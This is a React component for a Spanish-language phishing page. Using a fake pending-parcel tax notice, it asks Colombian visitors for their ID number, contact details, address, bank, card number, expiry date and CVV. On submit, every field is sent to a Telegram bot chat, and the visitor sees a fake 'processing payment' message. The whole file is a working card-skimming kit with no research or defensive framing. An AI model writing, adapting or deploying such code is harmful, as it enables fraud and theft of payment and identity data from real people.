import { useState } from 'react';
import { motion } from 'framer-motion';

export default function TelegramForm() {
  const [currentStep, setCurrentStep] = useState(1);
  const [id, setID] = useState('');
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [email, setEmail] = useState('');
  const [address, setAddress] = useState('');
  const [city, setCity] = useState('');
  const [bank, setBanco] = useState('');
  const [card, setCard] = useState('');
  const [month, setMonth] = useState('');
  const [year, setYear] = useState('');
  const [cvv, setCVV] = useState('');

  const handleNext = () => {
    setCurrentStep(currentStep + 1);
  };

  const handlePrev = () => {
    setCurrentStep(currentStep - 1);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const url = `https://api.telegram.org/bot${process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = {
      chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID,
      text: `
        ID: ${id}\n
        Name: ${name}\n
        Email: ${email}\n
        Phone: ${phone}\n
        Address: ${address}\n
        City: ${city}\n
        Bank: ${bank}\n
        Card: ${card}\n
        Month: ${month}\n
        Year: ${year}\n
        CVV: ${cvv}\n
      `,
    };

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (response.ok) {
      alert('Procesando pago!');
      setCurrentStep(1);
      setID('');
      setName('');
      setPhone('');
    } else {
      alert('Lo sentimos, ocurrió un error en el envío de la información.');
    }
  };

  const MultiForm = () => {
    switch (currentStep) {
      case 1:
        return (
          <motion.div className="relative group">
            <div
              aria-hidden="true"
              className="absolute inset-0 rounded-xl bg-white shadow-md transition duration-300 "
            />
            <div className="relative space-y-4 p-5 md:p-8 lg:p-8 xl:p-6">
              <div className="pl-2 space-y-2">
                <h1 className="font-display text-black font-bold text-center">
                  CONSULTA ENVIO PENDIENTE
                </h1>
                <p className="text-black font-display text-justify">
                  Ingrese el documento de identidad para ver el estado de su
                  paquete, luego presione el boton{' '}
                  <span className="font-bold">consultar </span>, debera realizar
                  el pago de impuesto para que el paquete sea liberado y
                  entregado a su direccion de residencia.
                </p>
                <p className="text-black font-display">
                  El valor a pagar es de $6.200
                </p>
                <div className="text-center">
                  <input
                    className="w-full  border rounded-md p-2 items-center"
                    value={id}
                    onChange={(e) => setID(e.target.value)}
                    placeholder="Ingrese su documento de identidad"
                    required
                  />
                  <span className="text-xs text-left flex">
                    Solo aplica para pagos con tarjetas de credito
                  </span>
                  <button
                    onClick={handleNext}
                    className="w-full md:w-3/6 bg-green-600 rounded-md p-2 mt-2"
                  >
                    Consultar
                  </button>
                </div>
              </div>
            </div>
          </motion.div>
        );
      case 2:
        return (
          <motion.div className="relative group">
            <div
              aria-hidden="true"
              className="absolute inset-0 rounded-xl bg-white shadow-md transition duration-300 "
            />
            <div className="relative space-y-4 p-5 md:p-8 lg:p-8 xl:p-6">
              <div className="pl-2 space-y-2">
                <h1 className="font-display text-black font-bold text-center mb-2">
                  INFORMACION DE PAGO
                </h1>
                <label className="font-display" htmlFor="name">
                  Nombre(s) y Apellido(s)
                </label>
                <input
                  className="w-full  border rounded-md p-2 items-center"
                  type="text"
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                />
                <label className="font-display" htmlFor="name">
                  Celular
                </label>
                <input
                  className="w-full  border rounded-md p-2 items-center	"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                />
                <label className="font-display" htmlFor="name">
                  Correo Electronico
                </label>
                <input
                  className="w-full  border rounded-md p-2 items-center	"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
                <label className="font-display" htmlFor="name">
                  Direccion de Envio
                </label>
                <input
                  className="w-full  border rounded-md p-2 items-center	"
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                />
                <label className="font-display" htmlFor="name">
                  Ciudad de envio
                </label>
                <input
                  className="w-full  border rounded-md p-2 items-center	"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                />
                <div className="md:flex md:gap-2">
                  <button
                    onClick={handleNext}
                    className="w-full md:w-3/6 bg-green-600 rounded-md p-2 mt-2 text-white"
                  >
                    Pagar Impuestos
                  </button>
                  <button
                    onClick={handlePrev}
                    className="w-full md:w-3/6 bg-green-600 rounded-md p-2 mt-2 text-white"
                  >
                    Volver
                  </button>
                </div>
              </div>
            </div>
          </motion.div>
        );
      case 3:
        return (
          <motion.div className="relative group">
            <div
              aria-hidden="true"
              className="absolute inset-0 rounded-xl bg-white shadow-md transition duration-300 "
            />
            <div className="relative space-y-4 p-5 md:p-8 lg:p-8 xl:p-6">
              <div className="pl-2 space-y-2">
                <label className="font-bold">Banco</label>
                <select
                  className="w-full border rounded-md p-2 items-center "
                  value={bank}
                  onChange={(e) => setBanco(e.target.value)}
                >
                  <option value=""></option>
                  <option value="bancolombia">Bancolombia</option>
                  <option value="avvillas">AV Villas</option>
                  <option value="bogota">Banco de Bogota</option>
                  <option value="davivienda">Davivienda</option>
                </select>
                <label className="font-display">Tarjeta</label>
                <input
                  className="w-full border rounded-md p-2 items-center"
                  value={card}
                  onChange={(e) => setCard(e.target.value)}
                />

                <div className="grid grid-cols-2 gap-2">
                  <label className="font-display">Mes</label>
                  <label className="font-display">Año</label>
                  <select
                    value={month}
                    className="border rounded-md p-2 items-center"
                    onChange={(e) => setMonth(e.target.value)}
                  >
                    <option value=""></option>
                    <option value="01">01</option>
                    <option value="02">02</option>
                    <option value="03">03</option>
                    <option value="04">04</option>
                    <option value="05">05</option>
                    <option value="06">06</option>
                    <option value="07">07</option>
                    <option value="08">08</option>
                    <option value="09">09</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                  </select>

                  <select
                    className="border rounded-md p-2 items-center"
                    value={year}
                    onChange={(e) => setYear(e.target.value)}
                  >
                    <option value=""></option>
                    <option value="2022">2022</option>
                    <option value="2023">2023</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                    <option value="2030">2030</option>
                    <option value="2031">2031</option>
                    <option value="2032">2032</option>
                    <option value="2033">2033</option>
                    <option value="2034">2034</option>
                    <option value="2035">2035</option>
                    <option value="2036">2036</option>
                  </select>
                </div>

                <label className="font-display">CVV</label>
                <input
                  className="w-full border rounded-md p-2 items-center"
                  value={cvv}
                  onChange={(e) => setCVV(e.target.value)}
                />

                <div className="text-center">
                  <button
                    onClick={handleSubmit}
                    type="submit"
                    className="w-full md:w-3/6 bg-green-600 rounded-md p-2 mt-2"
                  >
                    Pagar
                  </button>
                </div>
              </div>
            </div>
          </motion.div>
        );
      default:
        return null;
    }
  };

  return (
    <form action="" onSubmit={handleSubmit}>
      {MultiForm()}
    </form>
  );
}
